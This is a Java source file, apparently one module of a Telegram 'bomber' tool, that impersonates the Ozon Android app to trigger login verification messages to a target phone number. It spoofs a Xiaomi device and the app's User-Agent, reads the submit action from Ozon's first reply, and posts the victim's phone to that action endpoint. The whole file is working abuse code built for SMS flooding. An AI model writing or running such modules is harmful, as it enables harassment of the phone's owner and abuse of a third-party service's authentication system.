package com.example.webapp.telegram.bomber.services;

import com.example.webapp.telegram.bomber.services.utils.Callback;
import com.example.webapp.telegram.bomber.services.utils.Service;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.springframework.lang.NonNull;

public class Ozon extends Service {

    @Override
    public void run(OkHttpClient client, Callback callback) {
        JSONObject json = new JSONObject();

        try {
            json.put("vendor", "Xiaomi");
            json.put("hasSmartLock", "true");
            json.put("hasBiometrics", "true");
            json.put("biometryType", "FINGER_PRINT");
            json.put("model", "Xiaomi M2010J19SY");
            json.put("deviceId", "none");
            json.put("version", "11");
        } catch (JSONException e) {
            e.printStackTrace();
        }

        client.newCall(new Request.Builder()
                .url("https://api.ozon.ru/composer-api.bx/page/json/v1?url=%2Fmy%2Fentry%2Fcredentials-required")
                .header("User-Agent", "ozonapp_android/13.18+1650")
                .post(RequestBody.create(MediaType.parse("application/json"), json.toString()))
                .build()).enqueue(new okhttp3.Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                callback.onFailure(call, e);
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                try {
                    JSONObject json = new JSONObject(response.body().string());
                    JSONObject req = new JSONObject();

                    req.put("vendor", "Xiaomi");
                    req.put("hasSmartLock", "true");
                    req.put("hasBiometrics", "true");
                    req.put("biometryType", "FINGER_PRINT");
                    req.put("model", "Xiaomi M2010J19SY");
                    req.put("deviceId", "none");
                    req.put("version", "11");
                    req.put("phone", getFormattedPhone());

                    client.newCall(new Request.Builder()
                            .url("https://api.ozon.ru/composer-api.bx/_action/" + json
                                    .getJSONObject("csma")
                                    .getJSONObject("entryCredentialsRequired")
                                    .getJSONObject("entryCredentialsRequired-227543-default-1")
                                    .getJSONObject("submitButton")
                                    .getString("action"))
                            .header("User-Agent", "ozonapp_android/13.18+1650")
                            .post(RequestBody.create(MediaType.parse("application/json"), req.toString()))
                            .build()).enqueue(callback);
                } catch (JSONException | NullPointerException e) {
                    callback.onError(e);
                }
            }
        });
    }
}